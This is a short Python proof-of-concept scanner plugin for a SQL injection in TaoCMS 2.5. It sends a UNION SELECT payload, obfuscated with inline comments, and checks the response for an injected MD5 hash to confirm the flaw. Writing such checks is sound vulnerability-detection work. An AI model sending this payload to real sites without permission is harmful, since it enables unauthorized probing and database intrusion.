#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  TaoCMS 2.5 sql inject
From : http://sebug.net/vuldb/ssvid-62606
"""
def assign(service, arg):
    if service == "taocms":
        return True, arg

def audit(arg):
    url = arg
    payload = ("index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5(3.1415),10,11%23&action=getatlbyid")
    target_url=url + payload
    code, head, body, _, _ = curl.curl('"%s"' % target_url)
    if code == 200:
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
         security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('taocms', 'http://www.example.com/')[1])
